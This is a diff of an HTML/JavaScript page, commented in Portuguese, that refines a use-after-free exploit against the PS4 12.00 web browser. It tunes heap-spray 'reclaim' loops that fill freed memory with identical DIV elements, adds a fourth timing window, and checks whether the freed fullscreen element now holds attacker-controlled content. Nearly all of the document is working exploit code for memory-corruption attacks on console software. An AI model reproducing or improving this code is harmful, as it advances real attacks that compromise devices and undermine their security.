@@ -2,11 +2,11 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Monotype Reclaim</title>
+<title>PS4 12.00 - UAF Precise Reclaim</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>PS4 12.00 - UAF Monotype Reclaim (DIV Control)</h2>
+<h2>PS4 12.00 - UAF Precise Reclaim (Aligned)</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
@@ -63,48 +63,50 @@ function setupFullscreen() {
 }
 
 // ==========================
-// 💣 MONOTYPE RECLAIM (DIV ONLY)
+// 💣 PRECISE MONOTYPE RECLAIM
 // ==========================
-function monotypeReclaim() {
-    log("[*] Monotype reclaim iniciado");
+function preciseReclaim() {
+    log("[*] Precise reclaim iniciado");
 
     let bucket = [];
 
-    // 🔥 Fase 1 — churn leve (fragmentação controlada)
-    for (let i = 0; i < 6000; i++) {
+    // 🔹 Fase 1 — churn controlado
+    for (let i = 0; i < 3000; i++) {
         let el = document.createElement("div");
         document.body.appendChild(el);
         el.remove();
     }
 
-    // 🔥 Fase 2 — REUSE DIRECIONADO (MESMO TIPO + MESMA ESTRUTURA)
-    for (let i = 0; i < 15000; i++) {
+    // 🔹 Fase 2 — REUSE DIRECIONADO (estrutura idêntica)
+    for (let i = 0; i < 12000; i++) {
         let el = document.createElement("div");
 
-        // 🔑 mesma estrutura do alvo
-        el.innerHTML = "<h1>CONTROL_" + i + "</h1>";
+        el.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>CONTROL_" + i + "<br>Press OPTIONS</h1>";
 
-        el.style.position = "absolute";
+        el.style.background = "black";
         el.style.width = "100%";
         el.style.height = "100%";
+        el.style.position = "absolute";
+        el.style.top = "0";
+        el.style.left = "0";
 
         document.body.appendChild(el);
         bucket.push(el);
     }
 
-    // 🔥 Fase 3 — churn final leve
-    for (let i = 0; i < 4000; i++) {
+    // 🔹 Fase 3 — churn final leve
+    for (let i = 0; i < 2000; i++) {
         let el = document.createElement("div");
         document.body.appendChild(el);
         el.remove();
     }
 
-    log("[*] Monotype reclaim finalizado: " + bucket.length);
+    log("[*] Precise reclaim finalizado: " + bucket.length);
     return bucket;
 }
 
 // ==========================
-// 🔬 DETECÇÃO DE CONTROLE REAL
+// 🔬 DETECÇÃO
 // ==========================
 function checkUAF(fsTarget) {
     log("---- CHECK UAF ----");
@@ -114,7 +116,7 @@ function checkUAF(fsTarget) {
         log("[CHECK] innerHTML = " + html);
 
         if (html && html.includes("CONTROL_")) {
-            log("[!!!] UAF CONTROLADO (DIV REUSE)");
+            log("[!!!] UAF CONTROLADO (MATCH PERFEITO)");
         }
 
     } catch(e) {
@@ -124,7 +126,6 @@ function checkUAF(fsTarget) {
     try {
         let node = fsTarget.firstChild;
         log("[CHECK] firstChild = " + node);
-
     } catch(e) {
         log("[UAF] firstChild erro");
     }
@@ -147,10 +148,11 @@ function trigger(fsTarget) {
         log("[ERRO]");
     }
 
-    // 🔥 janela crítica — mesmo padrão agressivo
-    setTimeout(() => monotypeReclaim(), 0);
-    setTimeout(() => monotypeReclaim(), 50);
-    setTimeout(() => monotypeReclaim(), 100);
+    // 🔥 janelas críticas (mantidas + ajuste fino)
+    setTimeout(() => preciseReclaim(), 0);
+    setTimeout(() => preciseReclaim(), 50);
+    setTimeout(() => preciseReclaim(), 100);
+    setTimeout(() => preciseReclaim(), 150); // 🔥 NOVO
 
     // 🔬 checks
     setTimeout(() => checkUAF(fsTarget), 10);
@@ -164,7 +166,7 @@ function trigger(fsTarget) {
         alert(logBuffer.join("\n"));
     }, 400);
 
-    // 🔁 comportamento original preservado
+    // 🔁 comportamento original
     setTimeout(() => location.reload(), 500);
 }
 
